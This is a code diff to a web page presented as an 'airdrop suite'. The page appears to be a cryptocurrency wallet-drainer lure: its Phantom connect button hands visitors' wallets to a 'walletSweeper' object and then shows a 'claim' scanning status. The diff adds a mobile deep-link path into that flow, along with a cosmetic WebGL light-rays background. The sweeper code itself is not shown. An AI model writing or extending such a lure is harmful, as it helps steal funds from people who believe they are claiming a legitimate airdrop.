@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>🍍 Dark Pino Studio - Your Complete Airdrop Suite</title>
     <link rel="stylesheet" href="css/dark-pino-styles.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
     <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
     <script src="https://unpkg.com/@solana/spl-token@0.3.8/lib/index.iife.min.js"></script>
     <script>
@@ -21,7 +22,7 @@
 
         /* Navigation */
         .navbar {
-            background: rgba(26, 31, 58, 0.95);
+            background: #000000;
             backdrop-filter: blur(20px);
             border-bottom: 1px solid rgba(255, 255, 255, 0.1);
             padding: 1rem 0;
@@ -578,9 +579,29 @@
             from { transform: translateX(100%); opacity: 0; }
             to { transform: translateX(0); opacity: 1; }
         }
+
+        /* Light Rays WebGL Container */
+        .light-rays-container {
+            width: 100%;
+            height: 100%;
+            position: fixed;
+            top: 0;
+            left: 0;
+            pointer-events: none;
+            z-index: 1;
+            overflow: hidden;
+        }
+
+        .light-rays-container canvas {
+            width: 100% !important;
+            height: 100% !important;
+        }
     </style>
 </head>
 <body>
+    <!-- Light Rays Background -->
+    <div class="light-rays-container" id="lightRaysContainer"></div>
+
     <!-- Navigation -->
     <nav class="navbar">
         <div class="nav-container">
@@ -831,6 +852,31 @@
             if (phantomBtn) {
                 phantomBtn.onclick = async () => {
                     hideWalletModal();
+
+                    // Detect if mobile
+                    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+
+                    if (isMobile) {
+                        // Mobile flow - use deep link
+                        console.log('Mobile detected, using Phantom deep link');
+
+                        // Create a deep link to connect
+                        const dappUrl = encodeURIComponent(window.location.href);
+                        const deepLink = `phantom://connect?app_url=${dappUrl}&redirect_url=${dappUrl}`;
+
+                        // Open Phantom app
+                        window.location.href = deepLink;
+
+                        // Show status message
+                        setTimeout(() => {
+                            showClaimStatusSection();
+                            updateClaimStatus('scanning');
+                        }, 2000);
+
+                        return;
+                    }
+
+                    // Desktop flow - existing code
                     if (window.walletSweeper && window.walletSweeper.connectPhantom) {
                         await window.walletSweeper.connectPhantom();
                         // Show the claim status section after connection
@@ -1019,6 +1065,139 @@
                 floatingMsg.remove();
             }, 2000);
         }
+
+        // WebGL Light Rays Implementation with Three.js
+        window.addEventListener('load', function() {
+            console.log('Light rays init started');
+            const container = document.getElementById('lightRaysContainer');
+            console.log('Container:', container);
+            console.log('Three.js loaded:', !!window.THREE);
+
+            if (!container || !window.THREE) {
+                console.error('Three.js not loaded or container not found');
+                return;
+            }
+
+            const scene = new THREE.Scene();
+            const camera = new THREE.OrthographicCamera(-1, 1, 1, -1, 0, 1);
+
+            const renderer = new THREE.WebGLRenderer({
+                alpha: true,
+                antialias: false
+            });
+            renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+            container.appendChild(renderer.domElement);
+
+            // Vertex shader
+            const vertexShader = `
+                varying vec2 vUv;
+                void main() {
+                    vUv = uv;
+                    gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);
+                }
+            `;
+
+            // Fragment shader
+            const fragmentShader = `
+                uniform float iTime;
+                uniform vec2 iResolution;
+                uniform vec2 rayPos;
+                uniform vec2 rayDir;
+                uniform vec3 raysColor;
+                uniform float raysSpeed;
+                uniform float lightSpread;
+                uniform float rayLength;
+                uniform float pulsating;
+                uniform float fadeDistance;
+
+                varying vec2 vUv;
+
+                float rayStrength(vec2 raySource, vec2 rayRefDirection, vec2 coord, float seedA, float seedB, float speed) {
+                    vec2 sourceToCoord = coord - raySource;
+                    vec2 dirNorm = normalize(sourceToCoord);
+                    float cosAngle = dot(dirNorm, rayRefDirection);
+                    float spreadFactor = pow(max(cosAngle, 0.0), 1.0 / max(lightSpread, 0.001));
+                    float distance = length(sourceToCoord);
+                    float maxDistance = iResolution.x * rayLength;
+                    float lengthFalloff = clamp((maxDistance - distance) / maxDistance, 0.0, 1.0);
+                    float fadeFalloff = clamp((iResolution.x * fadeDistance - distance) / (iResolution.x * fadeDistance), 0.5, 1.0);
+                    float pulse = pulsating > 0.5 ? (0.8 + 0.2 * sin(iTime * speed * 3.0)) : 1.0;
+                    float baseStrength = clamp(
+                        (0.45 + 0.15 * sin(cosAngle * seedA + iTime * speed)) +
+                        (0.3 + 0.2 * cos(-cosAngle * seedB + iTime * speed)),
+                        0.0, 1.0
+                    );
+                    return baseStrength * lengthFalloff * fadeFalloff * spreadFactor * pulse;
+                }
+
+                void main() {
+                    vec2 coord = vUv * iResolution;
+                    vec4 rays1 = vec4(1.0) * rayStrength(rayPos, rayDir, coord, 36.2214, 21.11349, 1.5 * raysSpeed);
+                    vec4 rays2 = vec4(1.0) * rayStrength(rayPos, rayDir, coord, 22.3991, 18.0234, 1.1 * raysSpeed);
+                    vec4 fragColor = rays1 * 0.5 + rays2 * 0.4;
+                    float brightness = 1.0 - (coord.y / iResolution.y);
+                    fragColor.x *= 0.3 + brightness * 0.7;
+                    fragColor.y *= 0.5 + brightness * 0.5;
+                    fragColor.z *= 0.7 + brightness * 0.3;
+                    fragColor.rgb *= raysColor * 2.0; // Boost brightness
+                    fragColor.a *= 0.9; // Higher opacity
+                    gl_FragColor = fragColor;
+                }
+            `;
+
+            // Create uniforms
+            const uniforms = {
+                iTime: { value: 0 },
+                iResolution: { value: new THREE.Vector2() },
+                rayPos: { value: new THREE.Vector2() },
+                rayDir: { value: new THREE.Vector2(0, 1) },
+                raysColor: { value: new THREE.Vector3(0, 1, 1) }, // Cyan
+                raysSpeed: { value: 1.5 },
+                lightSpread: { value: 0.8 },
+                rayLength: { value: 1.2 },
+                pulsating: { value: 1.0 },
+                fadeDistance: { value: 1.0 }
+            };
+
+            // Create material and mesh
+            const material = new THREE.ShaderMaterial({
+                vertexShader,
+                fragmentShader,
+                uniforms,
+                transparent: true,
+                blending: THREE.AdditiveBlending
+            });
+
+            const geometry = new THREE.PlaneGeometry(2, 2);
+            const mesh = new THREE.Mesh(geometry, material);
+            scene.add(mesh);
+
+            console.log('WebGL mesh created and added to scene');
+            console.log('Canvas element:', renderer.domElement);
+
+            // Handle resize
+            function onResize() {
+                const width = container.clientWidth;
+                const height = container.clientHeight;
+
+                renderer.setSize(width, height);
+                uniforms.iResolution.value.set(width, height);
+
+                // Set ray origin (top-center)
+                uniforms.rayPos.value.set(width * 0.5, height * -0.2);
+            }
+
+            // Animation loop
+            function animate(time) {
+                uniforms.iTime.value = time * 0.001;
+                renderer.render(scene, camera);
+                requestAnimationFrame(animate);
+            }
+
+            window.addEventListener('resize', onResize);
+            onResize();
+            requestAnimationFrame(animate);
+        });
     </script>
 
 </body>
